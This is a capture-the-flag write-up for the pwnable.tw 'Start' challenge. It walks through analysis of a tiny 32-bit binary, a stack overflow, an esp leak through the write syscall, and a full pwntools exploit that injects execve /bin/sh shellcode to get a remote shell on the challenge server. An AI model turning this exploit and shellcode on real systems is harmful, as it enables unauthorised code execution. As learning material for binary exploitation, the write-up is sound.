---
layout: single_c
title:  "Pwnable.tw Level 1 - Start"
date:   2019-08-14 1:00:16 +0530
categories: Pwnable.tw
tags: Binary-Exploitation
classes: wide
--- 
### [Pwnable.tw Level 1 - Start](https://pwnable.tw/challenge/#1)  

## Challenge
```
Start [100 pts]
Just a start.
nc chall.pwnable.tw 10000
```
We have to obtain a flag by exploiting the given binary

## Static Analysis
Lets check the file properties using `file` and `checksec` and `readelf`
``` bash
user@ctf:~/Downloads$ file orw
orw: ELF 32-bit LSB executable, <br>  
Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32,     
BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped

./checksec.sh --file ./start
user@ctf:~/Downloads$ ./checksec.sh --file ./start 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   ./start

user@ctf:~/Downloads$ readelf -l start

Elf file type is EXEC (Executable file)
Entry point 0x8048060
There are 1 program headers, starting at offset 52

Program Headers:
Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
LOAD           0x000000 0x08048000 0x08048000 0x000a3 0x000a3 R E 0x1000

Section to Segment mapping:
Segment Sections...
00     .text 
```
So the file doesn't seem to have `ASLR` or `canary`
Even though `checksec` mentions that stack is non executable, there is no `GNU STACK` header so the stack is
executable.

Lets try disassembling the program using `objdump`
```bash
objdump -d start -M intel

user@ctf:~/Downloads$ objdump -d start -M intel

start:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
8048060:	54                   	push   esp
8048061:	68 9d 80 04 08       	push   0x804809d
8048066:	31 c0                	xor    eax,eax
8048068:	31 db                	xor    ebx,ebx
804806a:	31 c9                	xor    ecx,ecx
804806c:	31 d2                	xor    edx,edx
804806e:	68 43 54 46 3a       	push   0x3a465443
8048073:	68 74 68 65 20       	push   0x20656874
8048078:	68 61 72 74 20       	push   0x20747261
804807d:	68 73 20 73 74       	push   0x74732073
8048082:	68 4c 65 74 27       	push   0x2774654c
8048087:	89 e1                	mov    ecx,esp
8048089:	b2 14                	mov    dl,0x14
804808b:	b3 01                	mov    bl,0x1
804808d:	b0 04                	mov    al,0x4
804808f:	cd 80                	int    0x80
8048091:	31 db                	xor    ebx,ebx
8048093:	b2 3c                	mov    dl,0x3c
8048095:	b0 03                	mov    al,0x3
8048097:	cd 80                	int    0x80
8048099:	83 c4 14             	add    esp,0x14
804809c:	c3                   	ret    

0804809d <_exit>:
804809d:	5c                   	pop    esp
804809e:	31 c0                	xor    eax,eax
80480a0:	40                   	inc    eax
80480a1:	cd 80                	int    0x80
``` 
So all that the program does is that it prints some text and then read input from the user  
Lets check if we can cause a buffer overflow
```bash
user@ctf:~/Downloads$ ./start
Let's start the CTF:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)

```
## Dynamic Analysis

Lets analyze the program using `gdb`
```bash
gdb-peda$ disas _start 
Dump of assembler code for function _start:
0x08048060 <+0>:	push   esp
0x08048061 <+1>:	push   0x804809d
0x08048066 <+6>:	xor    eax,eax
0x08048068 <+8>:	xor    ebx,ebx
0x0804806a <+10>:	xor    ecx,ecx
0x0804806c <+12>:	xor    edx,edx
0x0804806e <+14>:	push   0x3a465443
0x08048073 <+19>:	push   0x20656874
0x08048078 <+24>:	push   0x20747261
0x0804807d <+29>:	push   0x74732073
0x08048082 <+34>:	push   0x2774654c
0x08048087 <+39>:	mov    ecx,esp
0x08048089 <+41>:	mov    dl,0x14
0x0804808b <+43>:	mov    bl,0x1
0x0804808d <+45>:	mov    al,0x4
0x0804808f <+47>:	int    0x80
0x08048091 <+49>:	xor    ebx,ebx
0x08048093 <+51>:	mov    dl,0x3c
0x08048095 <+53>:	mov    al,0x3
0x08048097 <+55>:	int    0x80
0x08048099 <+57>:	add    esp,0x14
0x0804809c <+60>:	ret    
End of assembler dump.
gdb-peda$ break *_start+57
Breakpoint 1 at 0x8048099


gdb-peda$ r
Starting program: /home/itpc/Downloads/start 
Let's start the CTF:AAAABBBB

[----------------------------------registers-----------------------------------]
SNIPPPED
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048099 in _start ()

gdb-peda$ x/20wx $esp
0xffffd114:	0x41414141	0x42424242	0x2074720a	0x20656874
0xffffd124:	0x3a465443	0x0804809d	0xffffd130	0x00000001
0xffffd134:	0xffffd300	0x00000000	0xffffd31b	0xffffd326
0xffffd144:	0xffffd338	0xffffd368	0xffffd37e	0xffffd3af
0xffffd154:	0xffffd3c0	0xffffd3d4	0xffffd3e4	0xffffd407
```
If we look at the stack after the read we can see return value at offset 20 form our input (input was `AAAABBBB`) and the saved `esp` is at offset 24. The saved `esp` points to the value next to it

Now we have to find a value where we can point our `shellcode`. Since the stack is unreliable we will have
to find a way to leak the stack address.  We can leak the address by using the following `ROP` chain
We can leak the stack address by pointing `return` pointer to `write` at `0x08048087`

Take a look at the code below
``` bash
0x08048087 <+39>:	mov    ecx,esp
0x08048089 <+41>:	mov    dl,0x14
0x0804808b <+43>:	mov    bl,0x1
0x0804808d <+45>:	mov    al,0x4
0x0804808f <+47>:	int    0x80
0x08048091 <+49>:	xor    ebx,ebx
0x08048093 <+51>:	mov    dl,0x3c
0x08048095 <+53>:	mov    al,0x3
0x08048097 <+55>:	int    0x80
0x08048099 <+57>:	add    esp,0x14
0x0804809c <+60>:	ret    
```
First the value of `esp` is copied to `ecx` and then `write` syscall is made. If we overwrite `return` with 
`0x08048087` the program will write the value pointed by `esp` which will be the saved `esp`.  
And now `write` comes again and we can overflow again and add `shellcode` and overwrite the `return` value to point to our shellcode.  
our shell code will be at leaked `esp+20`  
I wrote a script to try it first
```python
from pwn import *
r = remote('chall.pwnable.tw', 10000)
buf="A"*20
buf+=p32(0x08048087)
r.recvuntil('CTF:')
r.send(buf)
esp=u32(r.recv()[:4])
print ("[+]ESP is at "+hex(esp))
```
```bash
user@ctf:~/Downloads/pwnable.tw$ python start.py 
[+] Opening connection to chall.pwnable.tw on port 10000: Done
[+]ESP is at 0xffc8a790
```
We can see that we have successfully leaked the value of `esp`
Now lets put together the exploit
```python
from pwn import *

def leak(r):
    buf="A"*20
    buf+=p32(0x08048087)
    r.recvuntil('CTF:')
    r.send(buf)
    esp=u32(r.recv()[:4])
    print ("[+]ESP is at "+hex(esp))
    return esp

def exploit(esp):
    buf="A"*20
    eip=p32(esp+20)
    #shellcode=asm(shellcraft.i386.linux.sh())
    shellcode = shellcode = '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
    payload=buf+eip+shellcode
    print ("[+]Sending Payload")
    r.send(payload)
    r.interactive()

r = remote('chall.pwnable.tw', 10000)
esp=leak(r)
exploit(esp)
```
Lets  run it
```bash
user@ctf:~/Downloads/pwnable.tw$ python start.py 
[+] Opening connection to chall.pwnable.tw on port 10000: Done
[+]ESP is at 0xff846ad0
[+]Sending Payload
[*] Switching to interactive mode
$ cd /home/start
$ ls
flag
run.sh
start
```
And we have a shell. The flag is in the `flag` file

### solved!

## After Thoughts
I am just a noob at binary exploitation and I found this challenge to be much more difficult that expected. And this  
is my first time doing an ROP related exploit. (I know that its just a simple ROP). Also if you don't know what
`pwntools` is, do check it out. Its an awesome python library that makes exploitation really easy.
